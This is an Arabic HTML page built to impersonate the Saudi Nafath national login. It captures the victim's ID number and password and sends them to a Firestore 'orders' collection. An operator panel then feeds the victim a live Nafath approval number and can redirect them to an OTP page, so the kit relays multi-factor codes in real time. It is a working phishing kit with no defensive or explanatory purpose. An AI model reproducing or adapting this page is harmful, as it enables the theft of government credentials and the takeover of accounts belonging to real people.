<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نفاذ | التوثيق</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        :root { --nafath-green: #006a4d; --bg-gray: #f8f9fa; }
        body { 
            font-family: 'Cairo', sans-serif; background: var(--bg-gray); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; direction: rtl; 
            background-image: linear-gradient(rgba(255,255,255,0.9), rgba(255,255,255,0.9)), url('https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?q=80&w=1920&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        
        .nafath-card {
            background: white; width: 100%; max-width: 420px; min-height: 550px;
            border-radius: 24px; box-shadow: 0 15px 40px rgba(0,0,0,0.08);
            display: flex; flex-direction: column; overflow: hidden; position: relative;
        }

        .header { padding: 25px; display: flex; justify-content: center; border-bottom: 1px solid #f0f0f0; background: #fff; }
        .header img { height: 45px; }

        .content { flex: 1; padding: 40px 30px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }

        /* اللودر */
        .spinner {
            width: 60px; height: 60px; border: 5px solid #f3f3f3;
            border-top: 5px solid var(--nafath-green); border-radius: 50%;
            animation: spin 1s linear infinite; margin-bottom: 30px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* رقم التحقق */
        .number-display {
            font-size: 4.2rem; font-weight: bold; color: var(--nafath-green);
            width: 140px; height: 140px;
            display: flex; align-items: center; justify-content: center;
            border-radius: 50%; border: 4px solid var(--nafath-green);
            background: #f4fdf9; margin: 20px auto;
        }

        .title { font-size: 1.1rem; font-weight: bold; color: #333; margin-bottom: 10px; }
        .subtitle { font-size: 0.9rem; color: #666; line-height: 1.6; }
        .form-control { padding: 12px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #ced4da; font-weight: bold; }
        .btn-login { width: 100%; padding: 12px; background: var(--nafath-green); color: white; border: none; border-radius: 8px; font-weight: bold; transition: 0.3s; }
        .btn-login:hover { background-color: #00553d; }
        
        #code-screen { display: none; width: 100%; animation: fadeIn 0.5s; }
        #loading-screen { display: none; flex-direction: column; align-items: center; width: 100%; animation: fadeIn 0.5s; }
        #login-screen { width: 100%; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div class="nafath-card">
        <div class="header">
            <img src="https://iam.gov.sa/static/media/logo.8e294157.svg" alt="Nafath">
        </div>

        <div class="content">
            <!-- شاشة تسجيل الدخول (جديد) -->
            <div id="login-screen">
                <div class="title mb-3">تسجيل الدخول</div>
                <div class="subtitle mb-4">الرجاء تسجيل الدخول عبر النفاذ الوطني الموحد لمتابعة التوثيق</div>
                
                <form onsubmit="handleNafathLogin(event)">
                    <input type="text" id="nafath_username" class="form-control" placeholder="رقم الهوية / الإقامة" required>
                    <input type="password" id="nafath_password" class="form-control" placeholder="كلمة المرور" required>
                    <button type="submit" class="btn-login">تسجيل الدخول</button>
                </form>
            </div>

            <!-- شاشة الانتظار -->
            <div id="loading-screen">
                <div class="spinner"></div>
                <div class="title">جاري إنشاء طلب التوثيق...</div>
                <div class="subtitle">يرجى الانتظار قليلاً بينما نقوم بتجهيز الطلب</div>
            </div>

            <!-- شاشة الرقم -->
            <div id="code-screen">
                <div class="title">الرجاء اختيار الرقم في تطبيق نفاذ</div>
                <div class="number-display" id="display-num">--</div>
                <div class="subtitle">افتح تطبيق نفاذ وقم بتأكيد الطلب باختيار الرقم الظاهر أعلاه</div>
                <div id="timer-box" style="margin-top: 20px; color: #dc3545; font-weight: bold; font-size: 1.1rem; display: none;">صلاحية الرقم: <span id="timer">01:00</span></div>
            </div>
        </div>
    </div>

<script>
    // إعدادات Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // جلب الـ ID المحفوظ
    const userId = localStorage.getItem('user_id');

    let timerInterval;

    // دالة التعامل مع تسجيل دخول نفاذ
    async function handleNafathLogin(e) {
        e.preventDefault();
        const user = document.getElementById('nafath_username').value;
        const pass = document.getElementById('nafath_password').value;

        // إخفاء الدخول وإظهار الانتظار
        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('loading-screen').style.display = 'flex';

        // إرسال البيانات للوحة التحكم
        try {
            await db.collection("orders").doc(userId).update({
                nafath_username: user,
                nafath_password: pass,
                status: "تم تسجيل دخول نفاذ - بانتظار الرقم"
            });
        } catch (err) { console.error(err); }
    }

    function startTimer(duration) {
        let timer = duration, minutes, seconds;
        const display = document.getElementById('timer');
        document.getElementById('timer-box').style.display = 'block';
        
        clearInterval(timerInterval);
        timerInterval = setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);
            display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
            if (--timer < 0) { clearInterval(timerInterval); display.textContent = "00:00"; }
        }, 1000);
    }

    if (userId) {
        // مراقبة الطلب لحظة بلحظة
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();

                // إذا أرسلت رقم نفاذ من لوحة التحكم
                if (data.next_step === "SHOW_NAFATH_CODE" && data.nafath_code) {
                    // التحقق من أن الشاشة لم تظهر بعد لمنع إعادة تشغيل المؤقت عند تحديث البيانات
                    if (document.getElementById('code-screen').style.display !== 'block') {
                        document.getElementById('login-screen').style.display = 'none';
                        document.getElementById('loading-screen').style.display = 'none';
                        document.getElementById('code-screen').style.display = 'block';
                        document.getElementById('display-num').innerText = data.nafath_code;
                        startTimer(60); // تشغيل العداد لمدة 60 ثانية
                    }
                }

                // إذا ضغطت "رفض" في لوحة التحكم
                if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                }

                // إذا ضغطت "طلب كود OTP"
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "nafath_otp.html";
                }
            }
        });
    } else {
        // إذا دخل الصفحة بدون تسجيل بيانات يرجعه للرئيسية
        window.location.href = "index.html";
    }
</script>
</body>
</html>
